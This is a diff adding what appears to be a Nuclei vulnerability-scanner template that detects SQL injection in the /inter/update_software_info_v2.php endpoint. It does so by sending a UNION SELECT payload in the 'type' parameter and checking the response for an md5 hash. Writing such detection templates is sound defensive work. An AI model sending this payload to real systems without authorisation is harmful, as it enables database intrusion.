@@ -1,0 +1,25 @@
+id: ejinshan-sqli-detection
+info:
+  name: SQL Injection Detection in /inter/update_software_info_v2.php
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Identifies a potential SQL Injection vulnerability in the /inter/update_software_info_v2.php endpoint by validating the presence of a hash in the response body.
+
+variables:
+  s1: "{{rand_int(10000000, 99999999)}}"
+
+http:
+  - raw:
+      - |
+        POST /inter/update_software_info_v2.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=-100+UNION+SELECT+1,md5({{s1}}),3,4,5,6,7,8--&key=&pageCount=0&curPage=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(s1)}}"
